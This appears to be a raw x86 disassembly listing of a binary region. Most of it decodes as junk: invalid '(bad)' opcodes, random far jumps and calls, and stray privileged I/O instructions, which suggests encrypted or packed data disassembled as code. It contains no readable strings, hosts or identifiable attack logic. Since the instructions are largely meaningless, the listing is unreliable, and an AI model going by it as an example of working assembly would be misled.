  413c25:	out    dx,al
  413c26:	cwde   
  413c27:	and    al,0x3b
  413c29:	pop    ds
  413c2a:	push   esp
  413c2b:	mov    bl,0x90
  413c2d:	adc    eax,0x31e8150b
  413c32:	push   edx
  413c33:	ins    BYTE PTR es:[edi],dx
  413c34:	and    eax,0x2bc8c1d1
  413c39:	or     al,0x46
  413c3b:	adc    dl,dl
  413c3d:	stc    
  413c3e:	and    eax,edx
  413c40:	push   edi
  413c41:	aad    0x81
  413c43:	pushf  
  413c44:	cmp    al,0xd2
  413c46:	arpl   WORD PTR fs:[edx+edx*8-0x4dd1fb25],bp
  413c4e:	pusha  
  413c4f:	in     al,0xbd
  413c51:	jmp    0x413cbf
  413c53:	in     eax,dx
  413c54:	in     eax,dx
  413c55:	lahf   
  413c56:	fdivr  DWORD PTR [esi+0x30]
  413c59:	call   0xe36:0x1029144
  413c60:	outs   dx,BYTE PTR ds:[esi]
  413c61:	pop    esp
  413c62:	or     al,0xc2
  413c64:	or     DWORD PTR [ecx-0x76],esp
  413c67:	lods   al,BYTE PTR ds:[esi]
  413c68:	in     al,0x63
  413c6a:	lahf   
  413c6b:	inc    ebp
  413c6c:	or     eax,0x4f89bffb
  413c71:	in     al,dx
  413c72:	sub    BYTE PTR [esi+0x62],dl
  413c75:	sub    eax,esp
  413c77:	mov    BYTE PTR ss:[ebx+ebp*8-0x27],ch
  413c7c:	jmp    0x29bd:0x6f26cff7
  413c83:	cmp    cl,dh
  413c85:	jg     0x413c78
  413c87:	inc    edi
  413c88:	clc    
  413c89:	sub    BYTE PTR [esi-0x22],bh
  413c8c:	mov    dl,0x64
  413c8e:	ror    DWORD PTR [edi],0x31
  413c91:	dec    edx
  413c92:	js     0x413c64
  413c94:	clc    
  413c95:	outs   dx,BYTE PTR ds:[esi]
  413c96:	mov    bl,0xb2
  413c98:	or     bh,al
  413c9a:	cmp    BYTE PTR [esi+0x2257df9f],cl
  413ca0:	scas   al,BYTE PTR es:[edi]
  413ca1:	std    
  413ca2:	add    DWORD PTR [esi+0x63],edx
  413ca5:	adc    ah,BYTE PTR [edi-0x1b]
  413ca8:	ror    DWORD PTR [eax],1
  413caa:	imul   BYTE PTR [ebp+0x3cf29c0b]
  413cb0:	lea    ebp,[esi+0x3b]
  413cb3:	mov    esi,DWORD PTR [ecx-0x4cf297b6]
  413cb9:	inc    ebx
  413cba:	out    dx,eax
  413cbb:	jns    0x413cc9
  413cbd:	push   ecx
  413cbe:	cmp    BYTE PTR [esi],bl
  413cc0:	and    esp,ebp
  413cc2:	jp     0x413c9b
  413cc4:	sbb    DWORD PTR [ebx-0x2050d021],ebp
  413cca:	inc    esp
  413ccb:	pop    eax
  413ccc:	cmp    al,0x6b
  413cce:	sbb    al,0xaa
  413cd0:	sub    eax,0xda658217
  413cd5:	pushf  
  413cd6:	mov    esi,0x6b64c117
  413cdb:	mov    edx,0xf44af680
  413ce0:	cmp    ch,BYTE PTR [ebp+0x2145dc4a]
  413ce6:	add    edx,DWORD PTR [edi]
  413ce8:	sub    esi,DWORD PTR [eax-0x642e6bdc]
  413cee:	icebp  
  413cef:	xchg   edi,eax
  413cf0:	ins    BYTE PTR es:[edi],dx
  413cf1:	sbb    eax,0x42c6f98e
  413cf6:	xchg   edi,eax
  413cf7:	cmp    BYTE PTR [ebp+0xd],ah
  413cfa:	dec    edx
  413cfb:	lahf   
  413cfc:	sti    
  413cfd:	fwait
  413cfe:	mov    ah,0x31
  413d00:	push   esi
  413d01:	jmp    0x8712:0xb95111ed
  413d08:	jb     0x413d11
  413d0a:	stc    
  413d0b:	icebp  
  413d0c:	cmp    al,al
  413d0e:	add    al,0xfb
  413d10:	(bad)  
  413d11:	mov    al,0x63
  413d13:	fs dec ecx
  413d15:	pop    ecx
  413d16:	icebp  
  413d17:	add    al,0x7f
  413d19:	fistp  QWORD PTR [ebx+0x10054d52]
  413d1f:	loopne 0x413cc1
  413d21:	cmp    eax,0xdd9a0b66
  413d26:	mov    al,0x73
  413d28:	icebp  
  413d29:	and    BYTE PTR [edx+ebx*2-0x62],dh
  413d2d:	jmp    DWORD PTR [ecx-0x4c76370f]
  413d33:	mov    ch,BYTE PTR [eax+0x21aa4514]
  413d39:	lods   eax,DWORD PTR ds:[esi]
  413d3a:	inc    esp
  413d3b:	pop    edx
  413d3c:	inc    edx
  413d3d:	ins    BYTE PTR es:[edi],dx
  413d3e:	add    BYTE PTR [esi-0x525e5475],al
  413d44:	mov    ebp,0xd70a08be
  413d49:	out    dx,al
  413d4a:	gs pop eax
  413d4c:	in     eax,0x81
  413d4e:	mov    eax,ds:0x9d0833dd
  413d53:	jnp    0x413d8b
  413d55:	push   esi
  413d56:	fild   WORD PTR [edx-0x4d7c7e59]
  413d5c:	leave  
  413d5d:	lock icebp 
  413d5f:	leave  
  413d60:	daa    
  413d61:	outs   dx,DWORD PTR ds:[esi]
  413d62:	adc    dh,BYTE PTR [edx-0x1f4e6b99]
  413d68:	adc    BYTE PTR [esi+0xd],0x6f
  413d6c:	and    DWORD PTR [ecx],edi
  413d6e:	inc    ecx
  413d6f:	sbb    eax,0xf3c64297
  413d74:	jo     0x413d78
  413d76:	adc    ah,BYTE PTR [edi+0x35ff6389]
  413d7c:	xor    ecx,DWORD PTR [edx+0x2b7ad90]
  413d82:	add    esp,DWORD PTR [esp+eiz*2-0x2da28606]
  413d89:	(bad)  
  413d8a:	adc    DWORD PTR [eax+0x6203915d],ebx
  413d90:	nop
  413d91:	in     eax,0xa6
  413d93:	iret   
  413d94:	push   ss
  413d95:	retf   0x65d0
  413d98:	jecxz  0x413d98
  413d9a:	hlt    
  413d9b:	dec    esi
  413d9c:	scas   eax,DWORD PTR es:[edi]
  413d9d:	sub    dh,BYTE PTR [edi+0x3e70bf83]
  413da3:	cmp    DWORD PTR [edi],0xffffff99
  413da6:	adc    al,BYTE PTR [ebx-0x5cd5a6c]
  413dac:	push   ss
  413dad:	test   DWORD PTR ds:0xefac59de,ebx
  413db3:	loopne 0x413dda
  413db5:	sub    al,0xc5
  413db7:	jnp    0x413d55
  413db9:	fs mov esi,0xed2a0437
  413dbf:	push   esi
  413dc0:	rol    DWORD PTR [ebx+0x51769061],1
  413dc6:	add    eax,DWORD PTR [edi+0x5e454f49]
  413dcc:	or     al,BYTE PTR [eax-0x22]
  413dcf:	push   0x72ec6639
  413dd4:	lds    esi,FWORD PTR [ecx+0x0]
  413dd7:	push   ebx
  413dd8:	inc    ecx
  413dd9:	rcr    DWORD PTR [eax+0x76978a78],0x10
  413de0:	pushf  
  413de1:	pop    esp
  413de2:	ss xchg edx,eax
  413de4:	sbb    esp,DWORD PTR [edi-0x78]
  413de7:	jno    0x413de0
  413de9:	pop    ebx
  413dea:	ds clc 
  413dec:	xchg   esp,eax
  413ded:	arpl   WORD PTR [ebx+0x33],ax
  413df0:	or     esi,eax
  413df2:	inc    eax
  413df3:	std    
  413df4:	aad    0xa3
  413df6:	mov    ecx,0xaabeebb5
  413dfb:	lods   eax,DWORD PTR ds:[esi]
  413dfc:	mov    ds:0xd2dad35a,al
  413e01:	sub    BYTE PTR [ebp+0x1562d477],bl
  413e07:	inc    eax
  413e08:	scas   eax,DWORD PTR es:[edi]
  413e09:	jg     0x413dad
  413e0b:	add    DWORD PTR [ecx],0xffffffb5
  413e0e:	inc    edx
  413e0f:	retf   0x174
  413e12:	and    DWORD PTR [ecx-0x67ea793a],eax
  413e18:	(bad)  
  413e19:	fs fwait
  413e1b:	fwait
  413e1c:	adc    ah,al
  413e1e:	xchg   DWORD PTR [edx+edi*8+0x172c00ba],eax
  413e25:	das    
  413e26:	loopne 0x413def
  413e28:	ja     0x413de2
  413e2a:	push   cs
  413e2b:	mov    esp,0x13984ebb
  413e30:	mov    ah,BYTE PTR [edi+0x38]
  413e33:	in     al,dx
  413e34:	sub    ebp,eax
  413e36:	aas    
  413e37:	and    BYTE PTR ds:0x1d04629f,al
  413e3d:	cdq    
  413e3e:	push   ebp
  413e3f:	or     DWORD PTR [edx],esp
  413e41:	lods   eax,DWORD PTR ds:[esi]
  413e42:	xchg   ecx,eax
  413e43:	mov    eax,0x37f75a0d
  413e48:	xor    al,0x84
  413e4a:	mov    edx,edi
  413e4c:	mov    DWORD PTR [edi],esp
  413e4e:	xchg   edi,eax
  413e4f:	cwde   
  413e50:	push   ds
  413e51:	test   DWORD PTR [ecx-0x299fe4e3],esi
  413e57:	adc    dh,dh
  413e59:	or     DWORD PTR [ebx-0x20fca4e8],esp
  413e5f:	xchg   BYTE PTR [ebx+0x46f5446b],dh
  413e65:	aaa    
  413e66:	pushf  
  413e67:	mov    BYTE PTR [ebx-0x51627aeb],dl
  413e6d:	imul   eax,DWORD PTR [esi+0x17],0xa4fb86a8
  413e74:	mov    DWORD PTR [edx-0x61f6fac1],esi
  413e7a:	lock mov ds:0x53e9327e,al
  413e80:	or     bl,ch
  413e82:	stos   BYTE PTR es:[edi],al
  413e83:	(bad)  
  413e84:	out    0x4,eax
  413e86:	mov    bl,0xf7
  413e88:	cmp    BYTE PTR [esi-0x1a],dh
  413e8b:	adc    eax,DWORD PTR [edx]
  413e8d:	bndstx [edx+0x70a9d252],bnd2
  413e94:	cmc    
  413e95:	push   ebp
  413e96:	adc    BYTE PTR cs:[ebx],0x85
  413e9a:	xchg   esp,eax
  413e9b:	addr16 hlt 
  413e9d:	popa   
  413e9e:	js     0x413eb0
  413ea0:	cmp    eax,0xf481708c
  413ea5:	mov    ah,0xc5
  413ea7:	fscale 
  413ea9:	push   ebx
  413eaa:	in     al,dx
  413eab:	jge    0x413e46
  413ead:	jp     0x413f07
  413eaf:	arpl   WORD PTR [ebp+0x42],ax
  413eb2:	repnz test eax,0xbb1770da
  413eb8:	popa   
  413eb9:	add    cl,ch
  413ebb:	xchg   ebp,eax
  413ebc:	mov    esi,?
  413ebe:	fisubr WORD PTR [esi]
  413ec0:	shl    eax,cl
  413ec2:	or     al,al
  413ec4:	test   DWORD PTR [ebx-0x5148adb1],0x8690d615
  413ece:	jae    0x413e8b
  413ed0:	fs xchg ecx,eax
  413ed2:	push   ecx
  413ed3:	fnstcw WORD PTR [edi+0x55cd53ae]
  413ed9:	push   es
  413eda:	push   edi
  413edb:	sbb    dl,BYTE PTR [esi]
  413edd:	out    dx,eax
  413ede:	jmp    0xa968:0xabf40e79
  413ee5:	fldl2t 
  413ee7:	pushf  
  413ee8:	repz loop 0x413f14
  413eeb:	mov    ebx,0xe478d52e
  413ef0:	and    ecx,esp
  413ef2:	lahf   
  413ef3:	fstp   QWORD PTR ds:0x3071050d
  413ef9:	mov    ebp,0x86e7eb73
  413efe:	jns    0x413f12
  413f00:	cli    
  413f01:	mov    edx,DWORD PTR [edi+edx*1]
  413f04:	ret    
  413f05:	ja     0x413f65
  413f07:	test   eax,0x1575ef6b
  413f0c:	gs ret 0x5912
  413f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f11:	adc    eax,0xb41dfd9e
  413f16:	push   ds
  413f17:	sti    
  413f18:	ja     0x413ef0
  413f1a:	aad    0xf2
  413f1c:	cmp    ebp,edx
  413f1e:	test   eax,0x4e5ff358
  413f23:	adc    BYTE PTR [edx-0x5],bl
  413f26:	ds adc eax,esi
  413f29:	js     0x413eca
  413f2b:	mov    dl,0xd4
  413f2d:	test   BYTE PTR [ecx+0xa],0x42
  413f31:	jns    0x413ed9
  413f33:	push   cs
  413f34:	pop    ds
  413f35:	scas   eax,DWORD PTR es:[edi]
  413f36:	adc    esi,DWORD PTR [ecx+0x5d]
  413f39:	aas    
  413f3a:	inc    ebx
  413f3b:	xchg   edx,eax
  413f3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f3d:	mov    ds:0x2daf52e,al
  413f42:	inc    ebp
  413f43:	xchg   BYTE PTR [eax-0x7a9a9cf0],dh
  413f49:	out    0x8a,al
  413f4b:	inc    ecx
  413f4c:	push   edi
  413f4d:	sbb    BYTE PTR [eax-0x2b],0x2
  413f51:	mov    BYTE PTR [eax+0x66d4174a],al
  413f57:	aad    0xe
  413f59:	mov    eax,ds:0x37651445
  413f5e:	dec    eax
  413f5f:	dec    edx
  413f60:	inc    eax
  413f61:	(bad)  
  413f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f63:	cdq    
  413f64:	sub    al,0x2d
  413f66:	js     0x413f6c
  413f68:	cmc    
  413f69:	pop    esi
  413f6a:	hlt    
  413f6b:	lahf   
  413f6c:	shl    DWORD PTR [edx-0x74741f6e],0x85
  413f73:	dec    esp
  413f74:	mov    BYTE PTR [ebx+0x6f],dh
  413f77:	push   es
  413f78:	popa   
  413f79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f7a:	jmp    0x413f16
  413f7c:	enter  0x2f61,0xbb
  413f80:	mov    ah,0x90
  413f82:	add    esp,DWORD PTR [ebp+0x25]
  413f85:	out    dx,al
  413f86:	loopne 0x413f78
  413f88:	or     DWORD PTR [edx],ebp
  413f8a:	mov    ebx,0xbcaba993
  413f8f:	int3   
  413f90:	jb     0x413fe0
  413f92:	aam    0xea
  413f94:	imul   ebp,DWORD PTR [edx-0x5b534934],0x8d7469c1
  413f9e:	into   
  413f9f:	pop    es
  413fa0:	retf   
  413fa1:	repz jg 0x414003
  413fa4:	std    
  413fa5:	aam    0x1d
  413fa7:	repnz lds ecx,FWORD PTR [esi+0x69897298]
  413fae:	fisubr WORD PTR [esi+0x5c94ec01]
  413fb4:	jg     0x413fad
  413fb6:	aam    0xb2
  413fb8:	retf   0x4af9
  413fbb:	fist   WORD PTR es:[ecx+0x313762a5]
  413fc2:	int    0xa2
  413fc4:	dec    ecx
  413fc5:	shl    ecx,cl
  413fc7:	(bad)  
  413fc8:	pop    edi
  413fc9:	lods   al,BYTE PTR ds:[esi]
  413fca:	out    dx,eax
  413fcb:	mov    cl,0xf3
  413fcd:	fistp  WORD PTR [esi-0xb]
  413fd0:	xchg   ebx,eax
  413fd1:	jns    0x413fbd
  413fd3:	xor    cl,BYTE PTR [edx-0x691a9056]
  413fd9:	out    dx,al
  413fda:	push   esi
  413fdb:	add    DWORD PTR [ecx],edx
  413fdd:	clc    
  413fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fdf:	dec    edx
  413fe0:	inc    eax
  413fe1:	cwde   
  413fe2:	pop    ecx
  413fe3:	add    esi,DWORD PTR [esi+ebx*1-0x16]
  413fe7:	adc    BYTE PTR ds:[ebx-0x8],al
  413feb:	in     eax,0x45
  413fed:	xchg   DWORD PTR [eax-0x65],esp
  413ff0:	pusha  
  413ff1:	sub    BYTE PTR [ebp+0x24fa1fff],ch
  413ff7:	pop    esi
  413ff8:	test   al,0xd
  413ffa:	into   
  413ffb:	push   0x2f33ff6e
  414000:	loope  0x414057
  414002:	mov    BYTE PTR [edx],al
  414004:	xchg   esp,eax
  414005:	fistp  QWORD PTR [ecx+0x15d30bf5]
  41400b:	xor    esi,DWORD PTR [esi-0x75]
  41400e:	in     al,0xc0
  414010:	(bad)  
  414011:	push   0x5910eaa4
  414016:	ficom  WORD PTR [esi-0x67]
  414019:	or     ch,BYTE PTR [edx]
  41401b:	adc    DWORD PTR [esp+ebx*4-0x799b6124],eax
  414022:	inc    ebp
  414023:	jmp    0x414093
  414025:	fwait
  414026:	test   al,0x7b
  414028:	cli    
  414029:	dec    ebx
  41402a:	mov    cl,0x85
  41402c:	pop    es
  41402d:	xchg   DWORD PTR [edx+0x11de63dd],ebp
  414033:	stc    
  414034:	call   0x6b23:0x53ce413d
  41403b:	pop    ecx
  41403c:	pop    ss
  41403d:	fild   DWORD PTR [ebx+eax*4-0x47]
  414041:	repnz sbb ch,BYTE PTR [edi+eiz*8+0x31]
  414046:	mov    edx,0xa6cf9b3f
  41404b:	or     BYTE PTR gs:[eax],cl
  41404e:	and    eax,0x45f04c45
  414053:	sbb    BYTE PTR [edx-0x25],0x6
  414057:	bound  ebp,QWORD PTR [edx+0x5749265d]
  41405d:	or     bl,BYTE PTR [edi+0x5b]
  414060:	or     BYTE PTR [edx+0x58703ba1],bl
  414066:	xchg   edi,eax
  414067:	push   esi
  414068:	mov    ds:0x75143e8f,eax
  41406d:	dec    ecx
  41406e:	mov    eax,ds:0xe67cb03d
  414073:	es jno 0x414037
  414076:	cwde   
  414077:	call   DWORD PTR [esi+0x1533c830]
  41407d:	jno    0x414045
  41407f:	and    dl,BYTE PTR [eax-0x4a]
  414082:	stos   DWORD PTR es:[edi],eax
  414083:	cmp    dl,BYTE PTR ds:0x918b3def
  414089:	jecxz  0x414067
  41408b:	test   al,0x1
  41408d:	je     0x414051
  41408f:	pop    ecx
  414090:	mov    ch,0xeb
  414092:	adc    dh,BYTE PTR [esi+eax*1-0x5f]
  414096:	push   ebp
  414097:	pop    edi
  414098:	loope  0x4140cd
  41409a:	cmp    DWORD PTR [ebp+0x15],ebp
  41409d:	js     0x414111
  41409f:	cwde   
  4140a0:	fnstsw WORD PTR [ebx+0x1]
  4140a3:	pop    edi
  4140a4:	inc    edi
  4140a5:	dec    edx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	cwde   
  4140a8:	test   BYTE PTR [ebx-0x40],dl
  4140ab:	xchg   edx,eax
  4140ac:	jp     0x41405e
  4140ae:	nop
  4140af:	fbstp  TBYTE PTR [ebp-0x513fefbf]
  4140b5:	jl     0x414042
  4140b7:	out    dx,al
  4140b8:	pop    ebp
  4140b9:	ret    0x6446
  4140bc:	jno    0x4140f5
  4140be:	out    dx,al
  4140bf:	xchg   esp,eax
  4140c0:	idiv   BYTE PTR [edx+ebx*2]
  4140c3:	adc    dh,BYTE PTR [edx+0x3f]
  4140c6:	cmp    BYTE PTR [edx-0x5d75818d],0xd9
  4140cd:	dec    ebx
  4140ce:	jo     0x414124
  4140d0:	inc    ecx
  4140d1:	jb     0x41406e
  4140d3:	mov    ah,0x19
  4140d5:	fmul   DWORD PTR [eax-0x12]
  4140d8:	retf   
  4140d9:	jno    0x41411e
  4140db:	push   edi
  4140dc:	push   ebp
  4140dd:	adc    edx,esp
  4140df:	xchg   ebp,eax
  4140e0:	mov    eax,ds:0x6993b9cd
  4140e5:	sub    esi,edi
  4140e7:	loopne 0x4140c1
  4140e9:	or     eax,0xf0f5a30f
  4140ee:	mov    DWORD PTR [ebp+0x3c],ebx
  4140f1:	mov    esi,0xc1c4818f
  4140f6:	shl    al,0x1b
  4140f9:	pop    ss
  4140fa:	mov    ds,WORD PTR [eax+0x79fe76e5]
  414100:	jb     0x414124
  414102:	or     al,0x74
  414104:	or     dh,BYTE PTR [edx]
  414106:	add    BYTE PTR [edx+edx*4-0x78],ah
  41410a:	fld    DWORD PTR [esi+0x2e85e469]
  414110:	das    
  414111:	popa   
  414112:	mov    dl,0xc
  414114:	das    
  414115:	inc    esi
  414116:	adc    BYTE PTR [eax+0x497dfe26],0xb3
  41411d:	and    eax,0xce6ed624
  414122:	(bad)  
  414123:	aam    0x9
  414125:	add    ebp,DWORD PTR [edi]
  414127:	inc    ebp
  414128:	xchg   esp,eax
  414129:	and    ecx,DWORD PTR [ecx+esi*2]
  41412c:	and    bh,BYTE PTR [eax]
  41412e:	in     al,dx
  41412f:	jbe    0x41416d
  414131:	dec    ebp
  414132:	xor    BYTE PTR [ecx+0x70],bl
  414135:	int    0xab
  414137:	loop   0x41417c
  414139:	cli    
  41413a:	dec    eax
  41413b:	popa   
  41413c:	mov    ds:0x1f973d28,eax
  414141:	adc    eax,0x172974c3
  414146:	dec    ebx
  414147:	popf   
  414148:	pop    edx
  414149:	jp     0x414156
  41414b:	mov    ds:0x1e9bd0d6,al
  414150:	sahf   
  414151:	jl     0x414152
  414153:	hlt    
  414154:	mov    esp,0xdf03a7a
  414159:	ds jb  0x414125
  41415c:	nop
  41415d:	bound  ebx,QWORD PTR [ebx]
  41415f:	lods   eax,DWORD PTR gs:[esi]
  414161:	fwait
  414162:	mov    bh,BYTE PTR [ecx]
  414164:	dec    edx
  414165:	xchg   ebx,eax
  414166:	stos   DWORD PTR es:[edi],eax
  414167:	push   edi
  414168:	mov    WORD PTR [ebp-0x5b],cs
  41416b:	or     cl,BYTE PTR [esi-0xb]
  41416e:	lds    ebp,FWORD PTR [edx]
  414170:	fcomp  QWORD PTR [eax]
  414172:	test   BYTE PTR [edi+0x1ad0ed00],ch
  414178:	mov    ds:0xd4b04484,eax
  41417d:	xchg   esp,eax
  41417e:	inc    edx
  41417f:	cmp    cl,BYTE PTR [ebx+0x6b]
  414182:	or     ah,BYTE PTR [ebp-0x77]
  414185:	cwde   
  414186:	(bad)  
  414187:	mov    ah,0xd9
  414189:	jae    0x41417b
  41418b:	sub    DWORD PTR [ecx],edi
  41418d:	pop    edi
  41418e:	ins    DWORD PTR es:[edi],dx
  41418f:	xor    edx,edx
  414191:	or     eax,edx
  414193:	mov    edx,DWORD PTR [ebp-0x34]
  414196:	add    eax,DWORD PTR ds:0x422298
  41419c:	shrd   ecx,edx,0x2
  4141a0:	xor    ecx,edi
  4141a2:	shr    edx,0x2
  4141a5:	mov    edx,DWORD PTR [ebp-0x38]
  4141a8:	mov    edi,DWORD PTR [ebp-0x34]
  4141ab:	xor    edi,edi
  4141ad:	jmp    0x414737
  4141b2:	jb     0x414219
  4141b4:	(bad)  
  4141b5:	jecxz  0x414157
  4141b7:	sub    BYTE PTR [edx],dl
  4141b9:	push   esp
  4141ba:	xchg   edx,eax
  4141bb:	das    
  4141bc:	mov    esp,0xb47176ae
  4141c1:	jb     0x414203
  4141c3:	lock or al,0x16
  4141c6:	cmp    eax,0x52161604
  4141cb:	ins    BYTE PTR es:[edi],dx
  4141cc:	jno    0x4141aa
  4141ce:	call   0xb3b0:0xabcd63d5
  4141d5:	adc    al,0xc2
  4141d7:	sub    BYTE PTR [ecx+0x4a055745],ah
  4141dd:	mul    BYTE PTR [edx-0x2c]
  4141e0:	stc    
  4141e1:	aam    0x11
  4141e3:	and    ebp,DWORD PTR [eax+0x57]
  4141e6:	test   cl,ah
  4141e8:	sahf   
  4141e9:	mov    ebp,0xc4ba888f
  4141ee:	jno    0x414178
  4141f0:	pop    edi
  4141f1:	dec    ebp
  4141f2:	dec    esi
  4141f3:	mov    eax,0x3148083f
  4141f8:	sbb    eax,ebx
  4141fa:	lahf   
  4141fb:	pop    ss
  4141fc:	and    DWORD PTR ds:0x60dbffe8,esi
  414202:	fiadd  DWORD PTR [eax-0x6c]
  414205:	iret   
  414206:	fnstenv [edi-0x9]
  414209:	push   ss
  41420a:	add    esi,DWORD PTR [ebp-0xd]
  41420d:	ss mov ebp,0x1d2c1207
  414213:	sbb    ebp,DWORD PTR [edi+esi*2]
  414216:	in     eax,0xab
  414218:	gs push esi
  41421a:	push   0xfea6933c
  41421f:	mov    cl,0xc8
  414221:	js     0x414233
  414223:	mov    ecx,0xd934ed28
  414228:	push   es
  414229:	cs int3 
  41422b:	and    ecx,0x554ea1c9
  414231:	jg     0x414223
  414233:	push   ds
  414234:	fs and bl,bl
  414237:	or     BYTE PTR [ebx+eiz*2+0x5d],bh
  41423b:	add    DWORD PTR [ecx],0xffffffff
  41423e:	jmp    0x5d83ae74
  414243:	jg     0x4141e0
  414245:	sti    
  414246:	fwait
  414247:	nop
  414248:	jnp    0x4141ea
  41424a:	jb     0x4142ba
  41424c:	mov    es,WORD PTR [eax]
  41424e:	pop    eax
  41424f:	and    edi,DWORD PTR [ecx]
  414251:	mov    esp,ebx
  414253:	jmp    0x9edd:0xe3259378
  41425a:	push   ds
  41425b:	adc    al,0x2c
  41425d:	cmp    bh,bh
  41425f:	xchg   DWORD PTR [ecx+0x51],ebp
  414262:	fist   DWORD PTR [ebp+0x2d7ea2d]
  414268:	xlat   BYTE PTR ds:[ebx]
  414269:	xor    ebp,DWORD PTR [ebx+eax*4+0x34455961]
  414270:	into   
  414271:	scas   eax,DWORD PTR es:[edi]
  414272:	call   FWORD PTR [edi]
  414274:	jno    0x4142d9
  414276:	stc    
  414277:	jmp    0x414224
  414279:	xchg   esi,eax
  41427a:	std    
  41427b:	mov    bl,0xb3
  41427d:	adc    edx,DWORD PTR [edx+0xc]
  414280:	retf   0xd16b
  414283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414284:	xchg   ecx,eax
  414285:	icebp  
  414286:	rol    edx,cl
  414288:	jns    0x4142e9
  41428a:	sbb    edx,DWORD PTR [esi-0x27]
  41428d:	mov    DWORD PTR [ebx],edi
  41428f:	sbb    ebx,ecx
  414291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414292:	sub    al,0xdf
  414294:	sub    al,0x9a
  414296:	nop
  414297:	cwde   
  414298:	pop    ebx
  414299:	dec    esp
  41429a:	add    al,0x9c
  41429c:	xor    esi,DWORD PTR [ebx+eiz*1]
  41429f:	mov    dl,0xe8
  4142a1:	dec    ebp
  4142a2:	jecxz  0x414274
  4142a4:	jne    0x4142d2
  4142a6:	repz pop ebx
  4142a8:	cdq    
  4142a9:	pop    esi
  4142aa:	into   
  4142ab:	test   eax,0xac4cee1c
  4142b0:	ds out dx,eax
  4142b2:	(bad)  
  4142b3:	cdq    
  4142b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142b6:	lods   al,BYTE PTR ds:[esi]
  4142b7:	pop    edx
  4142b8:	pop    ebx
  4142b9:	(bad)  
  4142ba:	dec    ebx
  4142bb:	push   eax
  4142bc:	jmp    0x414244
  4142be:	inc    edi
  4142bf:	xchg   DWORD PTR [ebp+0x1b],edx
  4142c2:	adc    dh,BYTE PTR [edi]
  4142c4:	cmp    DWORD PTR [edx+ecx*2-0x649b100d],ebp
  4142cb:	pop    eax
  4142cc:	scas   eax,DWORD PTR es:[edi]
  4142cd:	arpl   si,ax
  4142cf:	js     0x4142ed
  4142d1:	clc    
  4142d2:	or     bh,ah
  4142d4:	or     eax,0xabbf2998
  4142d9:	push   ecx
  4142da:	clc    
  4142db:	aas    
  4142dc:	pop    eax
  4142dd:	push   cs
  4142de:	test   esi,0x865e3df6
  4142e4:	mov    bl,0x5a
  4142e6:	mov    ah,BYTE PTR [ebp-0x39]
  4142e9:	fidivr WORD PTR [esi]
  4142eb:	mov    al,BYTE PTR [edx+0x59]
  4142ee:	nop
  4142ef:	ret    
  4142f0:	mov    ebp,0xb51d78b5
  4142f5:	fadd   DWORD PTR [edi-0x3e1c7e62]
  4142fb:	test   DWORD PTR [esp+ebp*4-0x6f],ebx
  4142ff:	mov    dl,ah
  414301:	cwde   
  414302:	mov    ah,0xe2
  414304:	aad    0x8d
  414306:	imul   edi,DWORD PTR [ecx+0x34],0x4fc97327
  41430d:	sbb    edx,DWORD PTR ds:0xa5a49eb8
  414313:	lods   eax,DWORD PTR ds:[esi]
  414314:	dec    ebp
  414315:	xchg   DWORD PTR [eax+0x20],edi
  414318:	stc    
  414319:	fcom   DWORD PTR [esi-0x36]
  41431c:	out    dx,al
  41431d:	sub    eax,0x678f6fe3
  414322:	lock pop edx
  414324:	and    al,0x27
  414326:	pop    ebp
  414327:	add    bh,BYTE PTR [edi]
  414329:	dec    ebx
  41432a:	fdiv   st(5),st
  41432c:	test   eax,0x62d272b9
  414331:	pusha  
  414332:	xlat   BYTE PTR ds:[ebx]
  414333:	fldenv [edi]
  414335:	fisubr DWORD PTR [eax+0x350514fe]
  41433b:	sub    eax,0x9a893f57
  414340:	fcomp  QWORD PTR [ebp-0x77]
  414343:	in     eax,dx
  414344:	fld    DWORD PTR [edx]
  414346:	sti    
  414347:	push   ebx
  414348:	adc    eax,0x8c2e27b3
  41434d:	call   0x528d:0xc3abc3bc
  414354:	scas   al,BYTE PTR es:[edi]
  414355:	(bad)  
  414357:	or     bh,BYTE PTR [ebx+0x674ebe07]
  41435d:	mov    edi,0xdf76dfb9
  414362:	xchg   DWORD PTR [ebx-0x6ad89a09],ebx
  414368:	inc    edi
  414369:	rcl    BYTE PTR [edx-0x379721d],cl
  41436f:	loope  0x4143cd
  414371:	or     DWORD PTR [ebp-0x3d4f678f],ebx
  414377:	xor    bl,BYTE PTR ds:0x89daecbb
  41437d:	stos   BYTE PTR es:[edi],al
  41437e:	jae    0x4143b2
  414380:	mov    ds:0x9ad19ad,eax
  414385:	inc    ebp
  414386:	ret    0xfba5
  414389:	and    DWORD PTR [edx],ebx
  41438b:	das    
  41438c:	xor    esp,ebx
  41438e:	sub    esi,edi
  414390:	xor    BYTE PTR [ebx+ecx*4+0x1f],0x58
  414395:	in     eax,0x86
  414397:	xchg   BYTE PTR [esi-0x28665a8e],cl
  41439d:	cli    
  41439e:	sub    BYTE PTR [ebx],0xef
  4143a1:	les    esp,FWORD PTR [ebp+0x74]
  4143a4:	in     eax,0x48
  4143a6:	outs   dx,BYTE PTR ds:[esi]
  4143a7:	jle    0x41435b
  4143a9:	fist   WORD PTR [ecx+0x31]
  4143ac:	or     dh,dl
  4143ae:	mov    ah,0x3b
  4143b0:	jb     0x4143dc
  4143b2:	lods   eax,DWORD PTR ds:[esi]
  4143b3:	mov    esp,0x385ad4d9
  4143b8:	sar    BYTE PTR [eax-0x23],cl
  4143bb:	ins    BYTE PTR es:[edi],dx
  4143bc:	(bad)  
  4143bd:	adc    al,0x9f
  4143bf:	mov    ds:0x6ae6d3e2,eax
  4143c4:	pushf  
  4143c5:	adc    DWORD PTR ds:0x460a2d60,edx
  4143cb:	jle    0x414355
  4143cd:	js     0x41439f
  4143cf:	stos   BYTE PTR es:[edi],al
  4143d0:	std    
  4143d1:	dec    eax
  4143d2:	in     eax,0x9
  4143d4:	jo     0x414446
  4143d6:	aaa    
  4143d7:	sbb    eax,0xd488f1cd
  4143dc:	addr16 pushf 
